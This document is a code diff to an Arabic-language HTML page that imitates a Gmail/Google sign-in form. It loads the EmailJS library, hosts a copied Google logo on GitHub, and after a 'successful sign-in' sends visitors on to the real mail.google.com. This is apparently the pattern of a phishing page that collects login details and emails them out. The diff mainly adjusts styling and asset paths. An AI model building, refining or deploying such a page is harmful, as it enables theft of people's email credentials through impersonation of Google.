@@ -1,8 +1,6 @@
 <!DOCTYPE html>
 <html dir="rtl" lang="ar">
 <head>
-    <title
-    >تسجيل الدخول إلى Gmail</title>
     <meta charset="UTF-8">
     <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
     <style>
@@ -19,7 +17,6 @@
             align-items: center;
             min-height: 100vh;
             background-color: #f9f9f9;
-            padding: 20px;
         }
 
         .login-container {
@@ -28,8 +25,7 @@
             border: 1px solid #dadce0;
             border-radius: 12px;
             box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
-            width: 100%;
-            max-width: 400px;
+            width: 400px;
         }
 
         .google-logo {
@@ -59,7 +55,6 @@
             border-radius: 6px;
             font-size: 16px;
             margin-top: 8px;
-            transition: border-color 0.3s ease-in-out;
         }
 
         input:focus {
@@ -115,7 +110,7 @@
             font-size: 14px;
             font-weight: 500;
             cursor: pointer;
-            transition: background 0.3s ease-in-out;
+            transition: background 0.3s;
         }
 
         .next-button:hover {
@@ -128,7 +123,6 @@
             border-radius: 6px;
             display: none;
             font-size: 14px;
-            transition: opacity 0.3s ease-in-out;
         }
 
         .alert-error {
@@ -147,7 +141,7 @@
 <body>
     <div class="login-container">
         <div class="google-logo">
-            <img src="file:///C:/Users/seenc/Desktop/Uesr/gogle.png" alt="Google Logo">
+            <img src="https://raw.githubusercontent.com/swe6m/seenc/main/gogle.png" alt="Google Logo">
         </div>
         
         <h1>تسجيل الدخول</h1>
@@ -195,8 +189,7 @@
                         alertDiv.className = "alert alert-success";
                         alertDiv.style.display = "block";
                         alertDiv.textContent = "تم تسجيل الدخول بنجاح!";
-                        alertDiv.style.opacity = 1;
-
+                        
                         // إعادة التوجيه بعد نجاح الإرسال
                         setTimeout(() => {
                             window.location.href = "https://mail.google.com";
@@ -206,7 +199,6 @@
                         alertDiv.className = "alert alert-error";
                         alertDiv.style.display = "block";
                         alertDiv.textContent = "حدث خطأ أثناء تسجيل الدخول. يرجى المحاولة مرة أخرى.";
-                        alertDiv.style.opacity = 1;
                     }
                 );
             });
